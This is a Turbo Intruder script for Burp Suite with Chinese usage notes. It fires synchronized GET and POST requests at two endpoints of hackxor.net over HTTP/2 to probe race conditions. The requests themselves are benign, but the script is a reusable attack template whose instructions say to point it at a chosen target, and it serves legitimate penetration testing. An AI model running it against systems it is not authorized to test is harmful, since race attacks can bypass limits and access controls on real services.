"""
多端点竞态攻击脚本 - Turbo Intruder

功能说明：
这是一个针对多个端点进行竞态攻击的脚本。
通过同时向不同的端点发送请求，测试应用程序在并发处理时的安全性。

使用场景：
- 测试不同端点间的竞态条件
- 验证跨端点的状态同步问题
- 检测并发访问控制缺陷
- 多接口业务逻辑竞态测试

攻击原理：
1. 同时向多个端点发送请求
2. 利用HTTP/2单包攻击特性
3. 观察不同端点的响应差异
4. 发现潜在的竞态条件漏洞

使用方法：
1. 修改endpoint为目标域名
2. 自定义req1和req2请求模板
3. 调整请求参数和数量
4. 运行脚本观察结果

参数说明：
- endpoint: 目标服务器地址
- concurrentConnections: 1（确保同步）
- engine: Engine.BURP2（HTTP/2引擎）
- gate: 'race1'（同步控制标签）
- 循环次数: 5次（可调整）

注意事项：
- 需要目标支持HTTP/2
- 请求模板需要根据实际目标调整
- 观察响应时间和状态码差异
"""

def queueRequests(target, wordlists):

    # 如果目标支持HTTP/2，指定engine=Engine.BURP2触发单包攻击
    # 如果只支持HTTP/1，使用Engine.THREADED或Engine.BURP
    # 更多信息请查看：https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint='https://hackxor.net:443',  # 目标服务器地址
                           concurrentConnections=1,              # 单连接确保同步
                           engine=Engine.BURP2                   # HTTP/2引擎
                           )

    # 第一个请求模板 - GET请求
    req1 = r'''GET /static/robots.txt?%s=test HTTP/1.1
Host: hackxor.net

'''

    # 第二个请求模板 - POST请求
    req2 = r'''POST /static/robots.txt?%s=test HTTP/1.1
Host: hackxor.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

'''

    # 循环发送多组请求，每组包含两个不同的端点请求
    for i in range(5):
        engine.queue(req1, 'search', gate='race1')  # GET请求，参数为'search'
        engine.queue(req2, 'hidden', gate='race1')  # POST请求，参数为'hidden'

    # 同步发送所有排队的请求
    engine.openGate('race1')


def handleResponse(req, interesting):
    # 记录所有响应，分析不同端点的响应差异
    table.add(req)
